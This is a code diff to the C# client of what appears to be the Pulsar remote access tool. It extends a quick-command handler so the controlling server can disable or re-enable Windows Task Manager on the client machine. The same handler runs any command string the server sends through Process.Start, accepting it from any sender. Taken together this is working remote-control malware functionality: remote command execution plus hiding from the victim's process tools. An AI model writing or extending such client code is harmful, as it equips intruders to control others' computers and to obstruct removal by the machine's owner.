@@ -1,17 +1,16 @@
 ﻿using Pulsar.Common.Messages;
 using Pulsar.Common.Networking;
-using Pulsar.Common.Messages.FunStuff;
 using Pulsar.Common.Messages.Other;
-using Pulsar.Client.FunStuff;
 using Pulsar.Common.Messages.QuickCommands;
 using System.Diagnostics;
+using Pulsar.Client.Helper.TaskManager;
 
 namespace Pulsar.Client.Messages
 {
 
     public class QuickCommandHandler : IMessageProcessor
     {
-        public bool CanExecute(IMessage message) => message is DoSendQuickCommand;
+        public bool CanExecute(IMessage message) => message is DoSendQuickCommand || message is DoEnableTaskManager || message is DoDisableTaskManager;
 
         public bool CanExecuteFrom(ISender sender) => true;
 
@@ -20,6 +19,14 @@ namespace Pulsar.Client.Messages
             switch (message)
             {
                 case DoSendQuickCommand msg:
+                    Execute(sender, msg);
+                    break;
+
+                case DoEnableTaskManager msg:
+                    Execute(sender, msg);
+                    break;
+
+                case DoDisableTaskManager msg:
                     Execute(sender, msg);
                     break;
             }
@@ -39,6 +46,18 @@ namespace Pulsar.Client.Messages
             startInfo.Arguments = message.Command;
             process.StartInfo = startInfo;
             process.Start();
+        }
+
+        private void Execute(ISender client, DoEnableTaskManager message)
+        {
+            client.Send(new SetStatus { Message = "Task Manager Enabled" });
+            TaskManager.Enable();
+        }
+
+        private void Execute(ISender client, DoDisableTaskManager message)
+        {
+            client.Send(new SetStatus { Message = "Task Manager Disabled" });
+            TaskManager.Disable();
         }
     }
 }
